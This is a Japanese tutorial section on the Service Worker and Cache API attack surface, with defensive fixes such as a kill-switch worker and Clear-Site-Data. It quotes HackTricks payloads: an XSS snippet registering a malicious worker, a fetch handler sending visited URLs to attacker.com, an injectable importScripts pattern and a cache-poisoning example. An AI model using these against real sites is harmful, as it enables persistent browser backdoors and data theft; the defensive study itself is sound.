## Service Worker と Cache API の攻撃面

Service Worker（以下 SW）は、ページとネットワークの「あいだ」に常駐して通信を横取りできる、ブラウザ内のプロキシのような実行環境である。オフライン対応やプッシュ通知を実現する正規の技術だが、その「常駐する」「通信を横取りできる」という性質ゆえに、**XSS（クロスサイトスクリプティング）の被害を単発で終わらせず、長期間の永続化（persistence）とネットワーク盗聴に拡張する土台**になりうる。本節では、防御・自己所有環境での診断という観点から、SW と Cache API がなぜ攻撃面になるのか、そしてブラウザ側がどんな設計上の境界でそれを封じ込めているのかを、仕組みのレベルで解説する。

> 本節はすべて防御・自己所有環境での診断を目的とする。実在サービスや本番環境への無許可検証、破壊的な手順は扱わない。以降のコード例は、自分で立てた検証用オリジン（`https://localhost` など自己管理下の Secure Context）で挙動を確認する前提である。

### 前提知識：Service Worker とは何か、なぜ危険な素材なのか

まず用語をかみ砕く。

- **Service Worker（SW）**：あるオリジンに登録される、イベント駆動のバックグラウンドスクリプト。DOM には直接触れられないが、`fetch` イベントを購読することで、そのオリジン配下のページが出すネットワークリクエストを丸ごと横取り（intercept）し、任意のレスポンスを返せる。
- **スコープ（scope）**：SW が制御できる URL パスの範囲。`scope: '/'` なら、そのオリジンの全パス配下のリクエストを制御下に置く。
- **Secure Context（安全なコンテキスト）**：`https://` か `localhost` のように、通信路の完全性が担保された文脈。SW はここでしか登録・利用できない。
- **Cache API**：SW などから使える、リクエスト/レスポンスのペアを永続保存するストレージ。`caches.open(name)` で名前付きキャッシュを開き、`cache.match(request)` で保存済みレスポンスを引ける。SW が「オフラインでも動く」のは、このキャッシュから応答を返すからである。
- **sink（シンク）**：入力が最終的に実行・解釈される危険な代入先。SW の文脈では、`importScripts(url)`（外部スクリプトを同期ロードして実行する）が代表的な sink である。

SW が攻撃の素材として危険なのは、次の3つの性質が重なるからだ。

1. **常駐性・永続性**：一度登録された SW の登録情報は、IndexedDB のストレージと同様、明示的に消さない限り**無期限に残る**（Chromium 公式 FAQ の "Registrations persist indefinitely" の記述）。ページを閉じても、ブラウザを再起動しても生き続ける。
2. **ネットワーク横取り**：スコープ内の全リクエストに `fetch` ハンドラが割り込める。攻撃者が制御する SW は、被害者が見るページの内容を改ざんしたり、送信データを外部へコピーしたりできる。
3. **イベントで蘇る**：SW は常時走っているわけではない（Chrome は 30 秒アイドルで停止する）。しかし、対象ページへのアクセスやプッシュ等のイベントが来るたびにブラウザが起こす。つまり「消したはずの XSS」が、SW という形で被害者のブラウザに埋め込まれ、後日再訪しただけで再発動しうる。

この「XSS → SW 登録 → 永続化」という昇格こそが、本節の中心テーマである。

### 攻撃の全体像：XSS を永続的なバックドアに変える

HackTricks の記事は、SW を悪用する前提条件を明快に示す。攻撃者が必要とするのは、次のいずれかの組み合わせである。

- 「**任意の JS ファイルをサーバにアップロードする手段**と、その SW を読み込ませる **XSS**」
- あるいは「**出力を操作できる脆弱な JSONP リクエスト**」と XSS の組み合わせ

ここで重要なのは、**SW スクリプトの本体は必ず被害者オリジンから配信されなければならない**という制約である（同一オリジン制約。後述）。だから攻撃者は「攻撃者サーバに置いた `evil.js` を直接 SW にする」ことはできない。被害者オリジン上に JS を置ける経路（アップロード機能、出力を操作できる JSONP、あるいはオープンリダイレクトを介した経路など）が別途必要になる。XSS 単体では足りず、「オリジン上にスクリプトを配置する能力」との合わせ技が要る、というのが SW 悪用の勘所だ。

登録に使われる典型的なペイロードは次の通り。XSS で被害者のページ上にこのスクリプトを実行させる。

```html
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/error", true);
    xhttp2.send();
  });
});
</script>
```

**なぜこう書くのか**を分解する。

- `navigator.serviceWorker.register(sw, {scope: '/'})` が SW 登録 API の本体。第1引数 `sw` は**被害者オリジン上の相対パス**（`/uploaded/ws_js.js`）でなければならない。攻撃者はここに、事前にアップロードした悪性スクリプトを指す。
- `{scope: '/'}` でスコープをオリジン全体に広げ、そのサイトの全ページの通信を制御下に置く狙い。
- `.then(...) / function(err){...}` の分岐で、`attacker.com` に成否を通知している。攻撃者は「どの被害者で登録が成功したか」を収集できる。
- `window.addEventListener('load', ...)` でページのロード完了を待つのは、`navigator.serviceWorker` が確実に使える状態を保証するため。

登録後、被害者オリジンから配信される悪性 SW 本体（`ws_js.js`）が、スコープ内の通信を横取りする。HackTricks が示す `fetch` 横取りの実装は次の通り。

```javascript
self.addEventListener("fetch", (event) => {
  event.waitUntil(
    fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), {
      mode: "no-cors",
    }).catch(() => {}),
  )
  event.respondWith(caches.match(event.request).then((response) => response || fetch(event.request)))
})
```

**なぜこれが盗聴になるのか**を仕組みで説明する。

- `self.addEventListener("fetch", ...)` は、SW のスコープ内で発生する**あらゆるネットワークリクエスト**をイベントとして受け取る。ページが読み込む画像・API 呼び出し・遷移、そのすべてが `event.request` として渡ってくる。
- `fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), {mode:"no-cors"})` が漏えいの核心。被害者がアクセスした URL（クエリ文字列に機微情報が載ることも多い）を、丸ごと攻撃者サーバへ送り出している。`mode:"no-cors"` は、CORS のプリフライトやレスポンス読み取り制限を回避して「送るだけ」を成立させるための指定。攻撃者は応答を読む必要がなく、URL がサーバのアクセスログに残ればよいので、これで十分機能する。
- `event.waitUntil(...)` は、この送信処理が完了するまで SW を生かしておくための呼び出し（後述のアイドル停止で処理が途中終了するのを防ぐ）。
- `event.respondWith(caches.match(event.request).then(r => r || fetch(event.request)))` で、被害者には正常な応答を返す。まず Cache API に保存済みなら（`caches.match`）それを返し、無ければ本物のネットワーク（`fetch(event.request)`）から取得する。**被害者にとっては何も壊れていないように見える**ため、攻撃が発覚しにくい。ここに攻撃者が改ざんしたレスポンスを混ぜれば、コンテンツ改ざんや偽ログインフォームの注入も可能になる。

> 出典: Abusing Service Workers（HackTricks） — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers

### importScripts と CSP バイパス、DOM Clobbering との連鎖

SW 内では `importScripts(url)` で外部スクリプトを同期的に読み込んで実行できる。これが強力な sink になる。HackTricks は、これが「**CSP 保護すら回避しうる**」と指摘する。

**なぜ CSP を回避しうるのか**：ページに適用される Content-Security-Policy は、SW スクリプト自身のレスポンスに付けられた CSP で制御されるべきものであり、ページ側の `script-src` 制約とは別系統である。SW スクリプトのレスポンスに `importScripts` の読み込み元を縛る CSP が付いていなければ、SW 内の `importScripts` は任意オリジンのスクリプトを引き込めてしまう。だからこそ Chromium FAQ は「サイト運営者は SW スクリプトのレスポンスに CSP ヘッダを付け、`importScripts()` の読み込み元を制限すべき」と明記している。

脆弱なパターンは、`importScripts` に渡す URL を外部入力から組み立てるコードである。

```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
```

**なぜ危険か**：`host` の値が攻撃者の制御下にあれば、`https://attacker.com//sw_extra.js` のように攻撃者オリジンのスクリプトを SW 内で実行できてしまう。HackTricks は、この `host` パラメータが**DOM Clobbering**（HTML 要素の `id`/`name` 属性で JS のグローバル変数やプロパティを上書きし、値を注入する技法）で制御可能になるケースを挙げている。つまり「入力が直接クエリから来ていなくても、DOM 経由で汚染される」ため、`importScripts` の引数が完全に固定文字列でない限り疑う必要がある。

> 出典: Abusing Service Workers（HackTricks） — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers

### 更新の仕組みと永続化の上限、そしてキルスイッチ

SW の永続化はどこまで続くのか。ここはバージョン非依存の仕様レベルの挙動として、Chromium 公式 FAQ が明確な数値を示している（2024〜2026 年時点の現行仕様）。

- **登録は無期限に残る**（"Registrations persist indefinitely, similar to IndexedDB storage."）。
- しかし**ブラウザは 24 時間ごとに SW スクリプトを再検証（revalidate）する**。この再検証では HTTP キャッシュを無効化して取りに行くため、「古いコードが永遠に走り続ける」ことは防がれる（"Browsers revalidate scripts every 24 hours, invalidating HTTP cache to prevent indefinite stale code execution."）。
- つまり**攻撃者が確実に握れる永続化の窓は最大 24 時間**である。HackTricks も「The maximum persistence window extends 24 hours due to cache revalidation requirements」と一致した見解を示す。

この 24 時間更新チェックは、防御側にとって**キルスイッチ（kill-switch）**の根拠になる。HackTricks・Chromium FAQ の両方が、悪性 SW を排除する手段としてこれを推奨している。

- **キルスイッチ SW を配布する**：同じスクリプトパスに、自分自身を登録解除しキャッシュを一掃する SW を置く。24 時間以内の再検証で悪性 SW が「更新」され、無害化される。

```javascript
// 防御用キルスイッチ SW（自己所有オリジンでの是正用）
self.addEventListener("install", () => self.skipWaiting());
self.addEventListener("activate", async () => {
  const keys = await caches.keys();
  await Promise.all(keys.map((k) => caches.delete(k))); // Cache API の中身を消去
  await self.registration.unregister();                 // 自身の登録を解除
  const clients = await self.clients.matchAll();
  clients.forEach((c) => c.navigate(c.url));             // 制御下のページを再読込
});
```

- **`Clear-Site-Data` ヘッダを使う**：`Clear-Site-Data: "storage"`（あるいは `"*"`）を返すと、SW 登録・Cache API・その他ストレージをブラウザにまとめて消去させられる。
- **SW スクリプトに短い TTL を設定し、意図しない SW リクエストを拒否する**：Chromium FAQ は、サーバが `Service-Worker` リクエストヘッダを見て、SW 化を意図しないパスへの要求には `400 Bad Request` を返すべきだとする。ブラウザは SW スクリプトを取りに行くとき `Service-Worker: script` ヘッダを付けるため、サーバ側で「このパスを SW にしてよいか」を判定できる。

なお、更新時の挙動には注意点がある。HackTricks は「古い worker は、変更後のスクリプトが取得・インストール・アクティベートされるまで動き続ける（"the old worker can remain active until a changed script is fetched, installed, and activated"）」と述べる。**新しい SW は即座に置き換わるのではなく、いったん waiting 状態に入り、既存のページ（クライアント）が全部閉じられるか `skipWaiting()` が呼ばれて初めてアクティブ化される**という SW のライフサイクルに由来する挙動だ。だからキルスイッチ SW でも `self.skipWaiting()` と `clients.claim()` 相当を明示して、置き換えを急がせるのが定石になる。

> 出典: Abusing Service Workers（HackTricks） — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers
> 出典: Service Worker Security FAQ（Chromium） — https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md

### 検出とツール

診断・是正の第一歩は「今どんな SW が登録されているか」の把握である。

- **Chrome DevTools**：`Application` パネルの **Service Workers** セクションで、登録済み SW のスコープ・状態（installing/waiting/active）・ソースを確認でき、その場で `Unregister` できる。同パネルの **Cache Storage** で Cache API の中身も閲覧できる。HackTricks も「Service workers can be inspected ... from the Service Workers section of Chrome DevTools」と案内している。
- **`chrome://serviceworker-internals/`**：ブラウザ全体で登録されている SW を一覧できる内部ページ。
- **Shadow Workers**：HackTricks は、SW 悪用に特化した C2（command-and-control）フレームワークとして "Shadow Workers" を挙げている（"a command-and-control framework dedicated to service-worker exploitation"）。攻撃者側のツールだが、防御側は「SW を C2 として悪用する現実的な攻撃ツールが存在する」という事実を脅威モデルに織り込むべきである。本節では防御目的の把握にとどめ、攻撃手順は扱わない。

> 出典: Abusing Service Workers（HackTricks） — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers

### ブラウザ側の設計境界：なぜ被害が「そこまで」で止まるのか

攻撃面を正しく評価するには、ブラウザが SW を封じ込めるためにどんな境界を引いているかを理解する必要がある。Chromium 公式 FAQ は、その設計判断を整理している。以下、境界ごとに「なぜその制約があるか」を補う。

#### 同一オリジン制約とスコープ照合

- SW は**呼び出し元と同一オリジンでのみ動く**（"Service Workers must run in the same origin as their callers."）。**SW をクロスオリジンに登録することはできない**。これが「攻撃者は被害者オリジン上にスクリプトを置けなければならない」という前述の制約の根拠であり、XSS 単体で完結しない理由である。
- スコープ照合は**厳密なオリジン一致ではなく、URL の最長プレフィックス一致（longest-prefix / URL prefix comparison）**で行われる。FAQ はこれを「仕様上の隙間であり脆弱になりうるが、現時点では悪用不能」と率直に認めている。
- ただしプレフィックス照合はパスを含めて行われるため、`https://example.com/` と `https://example.com.evil.com/` は**別物として正しく区別される**。ホスト名の接尾辞トリックで別オリジンを乗っ取ることはできない。

**なぜ最長プレフィックス一致なのか**：SW のスコープは「このパス配下を制御する」という設計であり、`/app/` に登録された SW が `/app/page1`, `/app/page2` を制御できるようにするには、オリジン一致ではなくパス接頭辞での照合が自然だからだ。この設計上の緩さを FAQ 自身が「fragile」と評価している点は、診断時に頭の片隅に置く価値がある。

#### HTTPS（Secure Context）必須

- **Secure Context だけが SW を登録・利用できる**（"Only Secure Contexts can register or use Service Workers."）。

**なぜか**：SW は通信を横取りする強力な存在であり、中間者攻撃者が平文（HTTP）通信に悪性 SW を注入できてしまえば、被害は甚大になる。そこで「通信路の完全性が担保された文脈」でしか動かさない、という前提で危険性を封じている。

#### サードパーティ iframe とパーティション

- サードパーティ `iframe` は、**それ自身と親がすべて Secure Context である場合に限り** SW を登録できる。さらにこれらの登録は**トップレベルサイト（top-level site）でパーティション分割**される。

**なぜパーティションするのか**：これは近年（2020 年代前半以降）のプライバシー保護・ストレージ分割の流れに沿う。あるサイト A に埋め込まれた広告 iframe が登録した SW を、別サイト B に埋め込まれた同一ドメインの iframe と共有させないことで、クロスサイトのトラッキングや汚染を防いでいる。

#### 実行時間の制限とアイドル停止

- Chrome は**アイドルの SW を 30 秒で停止**する。イベント処理が 5 分を超える、あるいは同期処理で 30 秒応答しない SW は強制停止される。

**なぜか**：SW は無期限に「登録」されていても、常時 CPU を食うわけにはいかない。イベント駆動で必要なときだけ起き、終わったら止まる設計により、悪性 SW が背後で延々と計算資源を消費し続けることを構造的に抑えている。前掲の `event.waitUntil` は、この停止に処理を殺されないための保険である。

#### JS MIME タイプの強制とユーザープロンプト非採用

- 仕様は SW スクリプトに**正しい JavaScript の MIME タイプ**を要求する。これにより、攻撃者がペイロードを JPEG 等の非スクリプト形式に偽装して SW 化することを防ぐ。
- Chrome は SW 登録時に**ユーザーへの許可プロンプトを出さない**。FAQ はその理由を「キャッシュや CPU といったリソース利用の可否は、文脈を十分に理解できないユーザーに問うより自動で扱うほうが適切だから」と説明している（特に iframe が引き起こす API について）。

**診断上の含意**：登録にプロンプトが出ないということは、**XSS が成立すれば被害者に一切気づかれずに SW が仕込まれる**ことを意味する。だからこそ、CSP による XSS の予防、`importScripts` 元の制限、そして前述のキルスイッチ・`Clear-Site-Data` による事後是正の三段構えが、防御設計として重要になる。

#### SW が「できないこと」

FAQ は SW の能力上限も列挙する。SW は次のことができない。

- ユーザー許可が必要な API（位置情報・カメラ・マイク・USB・Bluetooth）を、事前許可なしに使うこと。
- オリジンをまたいで動くこと。
- ハンドラを起動するイベントなしに実行すること。
- ユーザー許可なしにプッシュ通知をポーリングすること。

これらは「悪性 SW を仕込まれても、それだけで端末のカメラを乗っ取られたりはしない」という被害範囲の上限を意味する。SW の脅威は主に**ネットワーク横取り・コンテンツ改ざん・永続化・情報漏えい**に集約される、と整理できる。

> 出典: Service Worker Security FAQ（Chromium） — https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md

### Cache API 独自の攻撃面

最後に、SW としばしばセットで語られる Cache API 自体の攻撃面を、専門知識に基づいて補足する（以下は原典2件の記述を踏まえた一般知識に基づく解説である）。

Cache API（`caches`）は SW 経由でなくても、ページの JS からも Secure Context であれば利用できる。攻撃面として押さえるべき点は次の通り。

- **キャッシュ汚染（cache poisoning）による永続改ざん**：XSS を得た攻撃者は、`caches.open()` でキャッシュを開き、`cache.put(request, new Response(悪性HTML))` のように**任意のレスポンスを被害者オリジンのキャッシュに書き込める**。SW の `fetch` ハンドラが `caches.match()` を優先して返す実装（前掲の例がまさにそれ）だと、この汚染キャッシュが正規ページの代わりに返され続ける。ネットワーク上のサーバは無傷なのに、被害者のブラウザ内でだけコンテンツが書き換わる、という検知しにくい状態を作れる。

```javascript
// 自己所有オリジンでのキャッシュ汚染の再現（診断用）
const cache = await caches.open("v1");
await cache.put(
  new Request("/index.html"),
  new Response("<h1>tampered</h1>", { headers: { "Content-Type": "text/html" } })
);
```

  **なぜ持続するか**：Cache API のエントリは、SW の登録と同様に明示的に削除されるまで残る。ページを閉じても消えないため、SW と組み合わせると「サーバを直しても被害者環境だけ汚染が残る」事態になりうる。是正には前述の `Clear-Site-Data` や、キルスイッチ SW での `caches.delete()` が必要になる。

- **機微データがキャッシュに残る情報漏えい**：認証済み API 応答や個人情報を安易に Cache API へ入れると、共有端末で後続ユーザーが `caches` から読み出せてしまう。Cache API はオリジン単位で隔離されるが、**同一オリジン内の別スクリプト（XSS 含む）からは読める**点に注意が要る。
- **是正の一貫性**：Cache Storage は DevTools の `Application > Cache Storage` で内容確認・削除ができる。SW を消しても Cache が残ると再汚染の温床になるため、SW 登録解除と Cache 削除は必ずセットで行う。

以上を総合すると、SW と Cache API の攻撃面の本質は「**Secure Context 上で、同一オリジンに配置できたコードが、通信横取り（SW）と永続ストレージ（Cache API）を握ることで、単発の XSS を被害者ブラウザ内の長期的なバックドアへ昇格させる**」点にある。ブラウザは同一オリジン制約・HTTPS 必須・24 時間再検証・パーティション分割で被害を封じているが、最終防衛線は「XSS を出さないこと」と「万一に備えたキルスイッチ・`Clear-Site-Data` の運用」であることを、診断・防御の結論として押さえておきたい。
